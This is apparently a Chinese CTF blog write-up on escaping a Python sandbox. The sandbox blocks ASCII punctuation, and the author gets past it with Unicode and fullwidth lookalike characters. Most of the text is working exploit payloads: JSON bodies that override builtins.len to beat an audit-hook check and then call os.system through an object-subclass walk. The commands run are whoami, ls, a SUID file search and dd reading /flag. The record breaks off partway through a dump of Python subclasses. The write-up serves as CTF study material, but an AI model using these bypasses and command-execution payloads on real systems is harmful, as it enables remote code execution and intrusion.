</p></blockquote><p><code>blacklist_pattern = r"[!\"#$%&amp;'()*+,-./:;&lt;=&gt;?@[\\\]^_</code>{|}~]”`</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> re<span class="token keyword">import</span> unidecode<span class="token keyword">def</span> <span class="token function">filter_surrogates</span><span class="token punctuation">(</span>text<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> re<span class="token punctuation">.</span>sub<span class="token punctuation">(</span><span class="token string">r'[\ud800-\udfff]'</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">,</span> text<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">create_ascii_to_unicode_dict</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    ascii_to_unicode <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>    <span class="token keyword">for</span> ascii_code <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">,</span> <span class="token number">127</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        ascii_char <span class="token operator">=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>ascii_code<span class="token punctuation">)</span>        unicode_chars <span class="token operator">=</span> <span class="token builtin">set</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">for</span> unicode_code <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0x10000</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            unicode_char <span class="token operator">=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>unicode_code<span class="token punctuation">)</span>            <span class="token comment"># 过滤代理字符</span>            clean_unicode_char <span class="token operator">=</span> filter_surrogates<span class="token punctuation">(</span>unicode_char<span class="token punctuation">)</span>            ascii_representation <span class="token operator">=</span> unidecode<span class="token punctuation">.</span>unidecode<span class="token punctuation">(</span>clean_unicode_char<span class="token punctuation">)</span>            <span class="token keyword">if</span> ascii_representation <span class="token operator">==</span> ascii_char <span class="token keyword">and</span> clean_unicode_char <span class="token operator">!=</span> ascii_char<span class="token punctuation">:</span>                unicode_chars<span class="token punctuation">.</span>add<span class="token punctuation">(</span>clean_unicode_char<span class="token punctuation">)</span>        <span class="token keyword">if</span> unicode_chars<span class="token punctuation">:</span>            ascii_to_unicode<span class="token punctuation">[</span>ascii_char<span class="token punctuation">]</span> <span class="token operator">=</span> unicode_chars    <span class="token keyword">return</span> ascii_to_unicodemapping_dict <span class="token operator">=</span> create_ascii_to_unicode_dict<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">for</span> ascii_char<span class="token punctuation">,</span> unicode_chars <span class="token keyword">in</span> <span class="token builtin">list</span><span class="token punctuation">(</span>mapping_dict<span class="token punctuation">.</span>items<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">10</span><span class="token punctuation">]</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"ASCII: </span><span class="token interpolation"><span class="token punctuation">{</span>ascii_char<span class="token punctuation">}</span></span><span class="token string">, Unicode: </span><span class="token interpolation"><span class="token punctuation">{</span><span class="token string">', '</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>unicode_chars<span class="token punctuation">)</span><span class="token punctuation">}</span></span><span class="token string">"</span></span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">ASCII:  , Unicode:  ,  ,  ,  ,  ,  , ,  , 　,  ,  ,  ,  ,  ,  , ⠀,  ,  , ፡ASCII: !, Unicode: ǃ, ⠮, ៎, ❢, ﹗, ܄, ܃, ！, ՜, ¡, ￢, ¬ASCII: ", Unicode: Ҍ, ʺ, “, ❝, ‟, ❞, 々, ״, ”, ＂, ⠐, ⹂, 〃, ˝, ¨, ゝ, ˮ, ゞ, ҍ, ヾ, ヽASCII: #, Unicode: ▫, ▌, █, ▣, ▁, ▮, ▧, ▪, ◷, ▯, ◶, ▬, ▤, ▰, ◩, ░, ▐, ￭, ▨, ▓, ◳, ▅, ⠼, ＃, ▉, ▊, ▢, ▭, ▩, ◱, ◵, ♯, ▇, ▃, ۞, ◧, ▎, ■, ◫, ▆, ▦, ▄, ◨, ◲, ﹟, ▂, ▱, ◰, ▀, ▥, □, ◪, ▍, ▋, ◴, ▒, ▏ASCII: $, Unicode: ﹩, ＄, ⠫ASCII: %, Unicode: ﹪, ％, ٪, ⁒, ⠩, ⸓ASCII: &amp;, Unicode: ⠯, ۽, ﹠, ϗ, ＆, ⁊ASCII: ', Unicode: ઼, ٔ, ❜, ′, ՚, ׳, ʼ, ’, ٕ, ݂, ့, ⠄, ਼, ⸯ, ´, ˓, ฺ, ᾿, ᐞ, ´, ྰ, ়, ៜ, ऽ, ܐ, ઽ, أ, ᢩ, ٱ, ٵ, ʹ, ॒, ‛, ＇, ٳ, ଽ, ‘, Ъ, ᾽, ʹ, ʿ, འ, އ, ़, ˈ, ଼, ь, ॔, ъ, Ь, ॑, ٲASCII: (, Unicode: ⠷, ⁽, ︵, （, ₍, ﹙ASCII: ), Unicode: ⠾, Ↄ, ₎, ⁾, ）, ﹚<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>好窒息。。。遂偷了一个别人的（</p><pre class="line-numbers language-none"><code class="language-none">"!": "！", '"': "＂", "#": "＃", "$": "＄", "%": "％", "&amp;": "＆", "'": "＇", "(": "（", ")": "）", "*": "＊", "+": "＋", ",": "❟", "-": "‐", ".": "․", "/": "╱", ":": "∶", ";": "；", "&lt;": "˂", "=": "゠", "&gt;": "˃", "?": "？", "@": "＠", "[": "［", "]": "］", "\\": "＼", "^": "⌃", "_": "‗", "`": "`",//测试了一下这个不行 "{": "｛", "|": "ǀ", "}": "｝", "~": "～"<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> reblacklist_pattern <span class="token operator">=</span> <span class="token string">r"[!\"#$%&amp;'()*+,-./:;&lt;=&gt;?@[\\\]^_`{|}~]"</span><span class="token keyword">def</span> <span class="token function">check_for_blacklisted_symbols</span><span class="token punctuation">(</span>input_text<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> re<span class="token punctuation">.</span>search<span class="token punctuation">(</span>blacklist_pattern<span class="token punctuation">,</span> input_text<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token boolean">True</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token boolean">False</span>    word<span class="token operator">=</span><span class="token string">"！＼＂＃＄＆＇（）＊＋❟‐╱∶․；？＠［］‗｛ǀ｝～"</span><span class="token keyword">if</span> <span class="token keyword">not</span> check_for_blacklisted_symbols<span class="token punctuation">(</span>word<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"hello"</span><span class="token punctuation">)</span> <span class="token comment">#hello</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>成功绕过</p><p>其实这么看来可以直接用全角字符进行绕过<del>（忘了咩，跪</del></p><p><del>算了就酱吧(我们大冤种是酱的</del></p><p>#AST沙箱绕过 #审计钩子audit hook绕过</p><p>文章都有写，便不再赘述了</p><p><a href="https://dummykitty.github.io/python/2023/05/29/python-%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E5%8E%9F%E7%90%86.html#%E5%9F%BA%E4%BA%8E-ast-%E7%9A%84%E6%B2%99%E7%AE%B1">CTF Pyjail 沙箱逃逸原理合集 - DumKiy’s blog</a></p><p>值得注意（当然也能大致推测进而猜到</p><blockquote><p>在最新的稳定版本Python3.12当中，我试了一下<code>event_name=="eval"</code>，貌似不存在这个<code>event_name</code>，在我使用内置的<code>eval</code>函数时，它的<code>event_name</code>实际上是<code>exec</code>和<code>compile</code>（<code>eval</code>或者<code>exec</code>函数需要先经过<code>complie</code>函数把字符串编译为字节码或者AST对象，才能够执行）</p></blockquote><p><a href="https://dummykitty.github.io/python/2023/05/30/pyjail-bypass-08-%E7%BB%95%E8%BF%87-AST-%E6%B2%99%E7%AE%B1.html">pyjail bypass-08 绕过 AST 沙箱 - DumKiy’s blog</a></p><p><a href="https://dummykitty.github.io/python/2023/05/30/pyjail-bypass-07-%E7%BB%95%E8%BF%87-audit-hook.html">pyjail bypass-07 绕过 audit hook - DumKiy’s blog</a></p><p>唉，头大·<del>虽然这三个是一个人写的吧（</del></p><p>一种是重写len函数</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">__builtins__<span class="token punctuation">.</span><span class="token builtin">len</span> <span class="token operator">=</span> <span class="token keyword">lambda</span> x<span class="token punctuation">:</span> <span class="token number">3</span><span class="token comment">#__builtins__ 是 Python 解释器内置的一个模块对象，它包含了 Python 中所有的内置名称，像 len、print、int 等。在全局命名空间中，__builtins__ 实际上是指向 builtins 模块（Python 3）或者 __builtin__ 模块（Python 2）的引用</span><span class="token comment">#len 原本是 Python 的内置函数，用于返回对象的长度。例如，对于列表、字符串、元组等可迭代对象，len() 会返回其包含的元素个数。</span><span class="token comment">#lambda x: 3是一个匿名函数（lambda 函数），它接受一个参数 x，但无论传入什么参数，该函数都会返回整数 3。</span><span class="token comment">#将 __builtins__ 模块中的 len 函数替换为了这个新定义的 lambda 函数。这意味着从这行代码执行之后，调用 len() 函数时，无论传入什么对象，都会返回 3</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token punctuation">{</span><span class="token string">"blocks"</span><span class="token punctuation">:</span><span class="token punctuation">{</span><span class="token string">"blocks"</span><span class="token punctuation">:</span><span class="token punctuation">[</span><span class="token punctuation">{</span><span class="token string">"type"</span><span class="token punctuation">:</span><span class="token string">"text"</span><span class="token punctuation">,</span><span class="token string">"fields"</span><span class="token punctuation">:</span><span class="token punctuation">{</span><span class="token string">"TEXT"</span><span class="token punctuation">:</span><span class="token string">"1';__builtins__.len = lambda x: 3;print(len('xaxaxa'))#"</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">]</span><span class="token punctuation">}</span><span class="token punctuation">}</span>（这时无<span class="token keyword">print</span><span class="token punctuation">{</span><span class="token string">"blocks"</span><span class="token punctuation">:</span><span class="token punctuation">{</span><span class="token string">"blocks"</span><span class="token punctuation">:</span><span class="token punctuation">[</span><span class="token punctuation">{</span><span class="token string">"type"</span><span class="token punctuation">:</span><span class="token string">"text"</span><span class="token punctuation">,</span><span class="token string">"fields"</span><span class="token punctuation">:</span><span class="token punctuation">{</span><span class="token string">"TEXT"</span><span class="token punctuation">:</span><span class="token string">"1＇；‗‗builtins‗‗․len＝lambda x∶ 3；print（len（＇xaxaxa＇））＃"</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">]</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">{</span><span class="token string">"blocks"</span><span class="token punctuation">:</span><span class="token punctuation">{</span><span class="token string">"blocks"</span><span class="token punctuation">:</span><span class="token punctuation">[</span><span class="token punctuation">{</span><span class="token string">"type"</span><span class="token punctuation">:</span><span class="token string">"text"</span><span class="token punctuation">,</span><span class="token string">"fields"</span><span class="token punctuation">:</span><span class="token punctuation">{</span><span class="token string">"TEXT"</span><span class="token punctuation">:</span><span class="token string">"1’；‗‗builtins‗‗․len＝lambda x：3；print（len（‘xaxaxa’））＃"</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">]</span><span class="token punctuation">}</span><span class="token punctuation">}</span> <span class="token comment">#rce用 ' 闭合，；分割，#注释</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>像’这种的用’或＇都行，但_#=等还是用‗＃＝等，不是都全角的。。。有的不能如法炮制，这么看来还是用一开始的最合理。（到底是一个一个找出来的</p><p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/2848488d570159a7a9301f14de745a3f.png"></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token punctuation">{</span><span class="token string">"blocks"</span><span class="token punctuation">:</span><span class="token punctuation">{</span><span class="token string">"blocks"</span><span class="token punctuation">:</span><span class="token punctuation">[</span><span class="token punctuation">{</span><span class="token string">"type"</span><span class="token punctuation">:</span><span class="token string">"text"</span><span class="token punctuation">,</span><span class="token string">"fields"</span><span class="token punctuation">:</span><span class="token punctuation">{</span><span class="token string">"TEXT"</span><span class="token punctuation">:</span><span class="token string">"1＇；‗‗builtins‗‗․len＝lambda x∶ 3；‗‗import‗‗（＂os＂）․system（＂whoami＂）；＃"</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">]</span><span class="token punctuation">}</span><span class="token punctuation">}</span>                             <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/d4b80e3079a03088728b5608083ca5ab.png"></p><p>okk</p><p>再照抄SSTIpayload即可</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token punctuation">[</span> x<span class="token punctuation">.</span>__init__<span class="token punctuation">.</span>__globals__ <span class="token keyword">for</span> x <span class="token keyword">in</span> <span class="token string">''</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__base__<span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">if</span> x<span class="token punctuation">.</span>__name__<span class="token operator">==</span><span class="token string">"_wrap_close"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"system"</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">"ls"</span><span class="token punctuation">)</span><span class="token comment">#首先，''.__class__.__base__ 会获取到 object 类，因为空字符串 '' 所属的类是 str，而 str 的基类是 object。接着，使用 __subclasses__() 方法获取 object 类的所有直接子类列表。之后，通过列表推导式筛选出类名为 _wrap_close 的类。再获取该类构造函数 __init__ 的全局命名空间 __globals__，从中找到 system 函数（一般是 os.system），最后调用该函数执行 ls 命令。</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token punctuation">{</span><span class="token string">"blocks"</span><span class="token punctuation">:</span><span class="token punctuation">{</span><span class="token string">"blocks"</span><span class="token punctuation">:</span><span class="token punctuation">[</span><span class="token punctuation">{</span><span class="token string">"type"</span><span class="token punctuation">:</span><span class="token string">"text"</span><span class="token punctuation">,</span><span class="token string">"fields"</span><span class="token punctuation">:</span><span class="token punctuation">{</span><span class="token string">"TEXT"</span><span class="token punctuation">:</span><span class="token string">"1＇；‗‗builtins‗‗․len＝lambda x∶ 3；［ x․‗‗init‗‗․‗‗globals‗‗ for x in ＇＇․‗‗class‗‗․‗‗base‗‗․‗‗subclasses‗‗（） if x․‗‗name‗‗＝＝＂‗wrap‗close＂］［0］［＂system＂］（＂ls＂）＃"</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">]</span><span class="token punctuation">}</span><span class="token punctuation">}</span>   <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>用这个也行</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token builtin">__import__</span><span class="token punctuation">(</span><span class="token string">"builtins"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token builtin">len</span><span class="token operator">=</span><span class="token keyword">lambda</span> x<span class="token punctuation">:</span> <span class="token number">3</span><span class="token punctuation">;</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">__import__</span><span class="token punctuation">(</span><span class="token string">"os"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>system<span class="token punctuation">(</span><span class="token string">"ls"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#__import__("os") 动态导入 os 模块，这是 Python 中用于与操作系统进行交互的标准模块。然后调用 os 模块的 system 函数，将字符串 "ls" 作为参数传入，从而执行系统的 ls 命令（在 Unix/Linux 系统中用于列出目录内容）。最后使用 print 函数输出 os.system 函数的返回值，该返回值通常是命令执行后的返回码。</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/073dfe1b9ad1158033ab6f27c110ef5f.png"></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token punctuation">{</span><span class="token string">"blocks"</span><span class="token punctuation">:</span><span class="token punctuation">{</span><span class="token string">"blocks"</span><span class="token punctuation">:</span><span class="token punctuation">[</span><span class="token punctuation">{</span><span class="token string">"type"</span><span class="token punctuation">:</span><span class="token string">"text"</span><span class="token punctuation">,</span><span class="token string">"fields"</span><span class="token punctuation">:</span><span class="token punctuation">{</span><span class="token string">"TEXT"</span><span class="token punctuation">:</span><span class="token string">"1＇；‗‗builtins‗‗․len＝lambda x∶ 3；［ x․‗‗init‗‗․‗‗globals‗‗ for x in ＇＇․‗‗class‗‗․‗‗base‗‗․‗‗subclasses‗‗（） if x․‗‗name‗‗＝＝＂‗wrap‗close＂］［0］［＂system＂］（＂ls ╱ ‐al＂）＃"</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">]</span><span class="token punctuation">}</span><span class="token punctuation">}</span>     <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/7bf577e7c6a076aba9f0d0fd5bdf095b.png"></p><blockquote><pre class="line-numbers language-none"><code class="language-none">在使用 ls -l 命令列出文件和目录详细信息时，会看到类似下面的输出：-rwxr-xr-- 1 user group 1024 Jan 1 12:00 example.txt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>这里 <code>-rwxr-xr--</code> 就是权限信息，其具体含义为：</p><ul><li>第一个字符表示文件类型，<code>-</code> 表示普通文件，<code>d</code> 表示目录，<code>l</code> 表示符号链接等。</li><li>接下来三个字符 <code>rwx</code> 是文件所有者（user）的权限，这里表示所有者具有读、写和执行权限。</li><li>再接下来三个字符 <code>r-x</code> 是文件所属组（group）的权限，即所属组用户有读和执行权限，但没有写入权限。</li><li>最后三个字符 <code>r--</code> 是其他用户（others）的权限，意味着其他用户只有读取权限。</li></ul></blockquote><p><a href="https://www.cnblogs.com/LINGX5/p/18387520">https://www.cnblogs.com/LINGX5/p/18387520</a></p><p>当然我肯定有权限（</p><p><del>就当我没权限（</del></p><blockquote><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">find</span> / <span class="token parameter variable">-type</span> f <span class="token parameter variable">-perm</span> <span class="token parameter variable">-4000</span> <span class="token operator"><span class="token file-descriptor important">2</span>&gt;</span>/dev/null<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>命令解释：<ul><li><code>find</code>：这是用于在文件系统中搜索文件的命令。</li><li><code>/</code>：表示从根目录开始搜索。</li><li><code>-type f</code>：指定只搜索普通文件。</li><li><code>-perm -4000</code>：用于查找具有 SUID 权限的文件，<code>4000</code> 是 SUID 权限的八进制表示。</li><li><code>2&gt;/dev/null</code>：将错误输出重定向到 <code>/dev/null</code>，这样可以忽略因权限不足而产生的错误信息。</li></ul></li></ul></blockquote><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token punctuation">{</span><span class="token string">"blocks"</span><span class="token punctuation">:</span><span class="token punctuation">{</span><span class="token string">"blocks"</span><span class="token punctuation">:</span><span class="token punctuation">[</span><span class="token punctuation">{</span><span class="token string">"type"</span><span class="token punctuation">:</span><span class="token string">"text"</span><span class="token punctuation">,</span><span class="token string">"fields"</span><span class="token punctuation">:</span><span class="token punctuation">{</span><span class="token string">"TEXT"</span><span class="token punctuation">:</span><span class="token string">"1＇；‗‗builtins‗‗․len＝lambda x∶ 3；［ x․‗‗init‗‗․‗‗globals‗‗ for x in ＇＇․‗‗class‗‗․‗‗base‗‗․‗‗subclasses‗‗（） if x․‗‗name‗‗＝＝＂‗wrap‗close＂］［0］［＂system＂］（＂find ╱ ‐type f ‐perm ‐4000 2˃╱dev╱null＂）＃"</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">]</span><span class="token punctuation">}</span><span class="token punctuation">}</span> <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p><code>dd</code> 是一个在类 Unix 系统中用于复制文件并对原文件的内容进行转换和格式化处理的命令。其基本语法为 <code>dd [选项]</code>，常见的选项有 <code>if</code>（输入文件）、<code>of</code>（输出文件）等。</p></blockquote><p><del>很可惜我看了看我没用过dd（</del></p><pre class="line-numbers language-python" data-language="python"><code class="language-python">dd <span class="token keyword">if</span><span class="token operator">=</span><span class="token operator">/</span>flag of<span class="token operator">=</span><span class="token operator">/</span>dev<span class="token operator">/</span>stdout<span class="token comment">#if=/flag：if 是 input file 的缩写，此参数指定了输入文件的路径。在这个命令里，输入文件为 /flag，意味着 dd 命令会从 /flag 文件中读取数据。</span><span class="token comment">#of=/dev/stdout：of 是 output file 的缩写，该参数指定了输出文件的路径。/dev/stdout 代表标准输出，也就是命令执行时，读取自 /flag 文件的数据会被输出到终端显示。</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>再把它塞到TEXT里就可了~（</p><p>另一种是用同是文中的_posixsubprocess 执行命令</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token punctuation">{</span><span class="token string">"blocks"</span><span class="token punctuation">:</span><span class="token punctuation">{</span><span class="token string">"blocks"</span><span class="token punctuation">:</span><span class="token punctuation">[</span><span class="token punctuation">{</span><span class="token string">"type"</span><span class="token punctuation">:</span><span class="token string">"text"</span><span class="token punctuation">,</span><span class="token string">"fields"</span><span class="token punctuation">:</span><span class="token punctuation">{</span><span class="token string">"TEXT"</span><span class="token punctuation">:</span><span class="token string">"1＇；print（（）․‗‗class‗‗․‗‗base‗‗․‗‗subclasses‗‗（））＃"</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">]</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>爆了一堆。。。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> redata<span class="token operator">=</span><span class="token triple-quoted-string string">'''[&lt;class 'type'&gt;, &lt;class 'async_generator'&gt;, &lt;class 'bytearray_iterator'&gt;, &lt;class 'bytearray'&gt;, &lt;class 'bytes_iterator'&gt;, &lt;class 'bytes'&gt;, &lt;class 'builtin_function_or_method'&gt;, &lt;class 'callable_iterator'&gt;, &lt;class 'PyCapsule'&gt;, &lt;class 'cell'&gt;, &lt;class 'classmethod_descriptor'&gt;, &lt;class 'classmethod'&gt;, &lt;class 'code'&gt;, &lt;class 'complex'&gt;, &lt;class '_contextvars.Token'&gt;, &lt;class '_contextvars.ContextVar'&gt;, &lt;class '_contextvars.Context'&gt;, &lt;class 'coroutine'&gt;, &lt;class 'dict_items'&gt;, &lt;class 'dict_itemiterator'&gt;, &lt;class 'dict_keyiterator'&gt;, &lt;class 'dict_valueiterator'&gt;, &lt;class 'dict_keys'&gt;, &lt;class 'mappingproxy'&gt;, &lt;class 'dict_reverseitemiterator'&gt;, &lt;class 'dict_reversekeyiterator'&gt;, &lt;class 'dict_reversevalueiterator'&gt;, &lt;class 'dict_values'&gt;, &lt;class 'dict'&gt;, &lt;class 'ellipsis'&gt;, &lt;class 'enumerate'&gt;, &lt;class 'filter'&gt;, &lt;class 'float'&gt;, &lt;class 'frame'&gt;, &lt;class 'frozenset'&gt;, &lt;class 'function'&gt;, &lt;class 'generator'&gt;, &lt;class 'getset_descriptor'&gt;, &lt;class 'instancemethod'&gt;, &lt;class 'list_iterator'&gt;, &lt;class 'list_reverseiterator'&gt;, &lt;class 'list'&gt;, &lt;class 'longrange_iterator'&gt;, &lt;class 'int'&gt;, &lt;class 'map'&gt;, &lt;class 'member_descriptor'&gt;, &lt;class 'memoryview'&gt;, &lt;class 'method_descriptor'&gt;, &lt;class 'method'&gt;, &lt;class 'moduledef'&gt;, &lt;class 'module'&gt;, &lt;class 'odict_iterator'&gt;, &lt;class 'pickle.PickleBuffer'&gt;, &lt;class 'property'&gt;, &lt;class 'range_iterator'&gt;, &lt;class 'range'&gt;, &lt;class 'reversed'&gt;, &lt;class 'symtable entry'&gt;, &lt;class 'iterator'&gt;, &lt;class 'set_iterator'&gt;, &lt;class 'set'&gt;, &lt;class 'slice'&gt;, &lt;class 'staticmethod'&gt;, &lt;class 'stderrprinter'&gt;, &lt;class 'super'&gt;, &lt;class 'traceback'&gt;, &lt;class 'tuple_iterator'&gt;, &lt;class 'tuple'&gt;, &lt;class 'str_iterator'&gt;, &lt;class 'str'&gt;, &lt;class 'wrapper_descriptor'&gt;, &lt;class 'zip'&gt;, &lt;class 'types.GenericAlias'&gt;, &lt;class 'anext_awaitable'&gt;, &lt;class 'async_generator_asend'&gt;, &lt;class 'async_generator_athrow'&gt;, &lt;class 'async_generator_wrapped_value'&gt;, &lt;class '_buffer_wrapper'&gt;, &lt;class 'Token.MISSING'&gt;, &lt;class 'coroutine_wrapper'&gt;, &lt;class 'generic_alias_iterator'&gt;, &lt;class 'items'&gt;, &lt;class 'keys'&gt;, &lt;class 'values'&gt;, &lt;class 'hamt_array_node'&gt;, &lt;class 'hamt_bitmap_node'&gt;, &lt;class 'hamt_collision_node'&gt;, &lt;class 'hamt'&gt;, &lt;class 'sys.legacy_event_handler'&gt;, &lt;class 'InterpreterID'&gt;, &lt;class 'line_iterator'&gt;, &lt;class 'managedbuffer'&gt;, &lt;class 'memory_iterator'&gt;, &lt;class 'method-wrapper'&gt;, &lt;class 'types.SimpleNamespace'&gt;, &lt;class 'NoneType'&gt;, &lt;class 'NotImplementedType'&gt;, &lt;class 'positions_iterator'&gt;, &lt;class 'str_ascii_iterator'&gt;, &lt;class 'types.UnionType'&gt;, &lt;class 'weakref.CallableProxyType'&gt;, &lt;class 'weakref.ProxyType'&gt;, &lt;class 'weakref.ReferenceType'&gt;, &lt;class 'typing.TypeAliasType'&gt;, &lt;class 'typing.Generic'&gt;, &lt;class 'typing.TypeVar'&gt;, &lt;class 'typing.TypeVarTuple'&gt;, &lt;class 'typing.ParamSpec'&gt;, &lt;class 'typing.ParamSpecArgs'&gt;, &lt;class 'typing.ParamSpecKwargs'&gt;, &lt;class 'EncodingMap'&gt;, &lt;class 'fieldnameiterator'&gt;, &lt;class 'formatteriterator'&gt;, &lt;class 'BaseException'&gt;, &lt;class '_frozen_importlib._WeakValueDictionary'&gt;, &lt;class '_frozen_importlib._BlockingOnManager'&gt;, &lt;class '_frozen_importlib._ModuleLock'&gt;, &lt;class '_frozen_importlib._DummyModuleLock'&gt;, &lt;class '_frozen_importlib._ModuleLockManager'&gt;, &lt;class '_frozen_importlib.ModuleSpec'&gt;, &lt;class '_frozen_importlib.BuiltinImporter'&gt;, &lt;class '_frozen_importlib.FrozenImporter'&gt;, &lt;class '_frozen_importlib._ImportLockContext'&gt;, &lt;class '_thread.lock'&gt;, &lt;class '_thread.RLock'&gt;, &lt;class '_thread._localdummy'&gt;, &lt;class '_thread._local'&gt;, &lt;class '_io.IncrementalNewlineDecoder'&gt;, &lt;class '_io._BytesIOBuffer'&gt;, &lt;class '_io._IOBase'&gt;, &lt;class 'posix.ScandirIterator'&gt;, &lt;class 'posix.DirEntry'&gt;, &lt;class '_frozen_importlib_external.WindowsRegistryFinder'&gt;, &lt;class '_frozen_importlib_external._LoaderBasics'&gt;, &lt;class '_frozen_importlib_external.FileLoader'&gt;, &lt;class '_frozen_importlib_external._NamespacePath'&gt;, &lt;class '_frozen_importlib_external.NamespaceLoader'&gt;, &lt;class '_frozen_importlib_external.PathFinder'&gt;, &lt;class '_frozen_importlib_external.FileFinder'&gt;, &lt;class 'codecs.Codec'&gt;, &lt;class 'codecs.IncrementalEncoder'&gt;, &lt;class 'codecs.IncrementalDecoder'&gt;, &lt;class 'codecs.StreamReaderWriter'&gt;, &lt;class 'codecs.StreamRecoder'&gt;, &lt;class '_abc._abc_data'&gt;, &lt;class 'abc.ABC'&gt;, &lt;class 'collections.abc.Hashable'&gt;, &lt;class 'collections.abc.Awaitable'&gt;, &lt;class 'collections.abc.AsyncIterable'&gt;, &lt;class 'collections.abc.Iterable'&gt;, &lt;class 'collections.abc.Sized'&gt;, &lt;class 'collections.abc.Container'&gt;, &lt;class 'collections.abc.Buffer'&gt;, &lt;class 'collections.abc.Callable'&gt;, &lt;class 'os._wrap_close'&gt;, &lt;class '_sitebuiltins.Quitter'&gt;, &lt;class '_sitebuiltins._Printer'&gt;, &lt;class '_sitebuiltins._Helper'&gt;, &lt;class 'types._C'&gt;, &lt;class 